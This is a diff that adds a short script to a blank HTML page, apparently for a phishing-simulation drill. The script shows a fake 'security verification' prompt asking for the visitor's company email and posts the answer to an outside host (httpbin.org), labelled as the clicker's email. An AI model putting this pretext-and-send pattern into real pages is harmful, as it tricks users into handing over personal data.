@@ -1,9 +1,23 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-<meta charset="UTF-8">
+<meta charset="utf-8">
 <title></title>
 </head>
 <body>
+<script>
+// 弹出输入邮箱
+let email = prompt('请输入您的企业邮箱以完成安全验证：', '');
+
+if (email) {
+  // 把邮箱发送到统计日志
+  fetch('https://httpbin.org/post', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: `点击人邮箱：${email}`,
+    headers: { 'Content-Type': 'text/plain' }
+  });
+}
+</script>
 </body>
 </html>
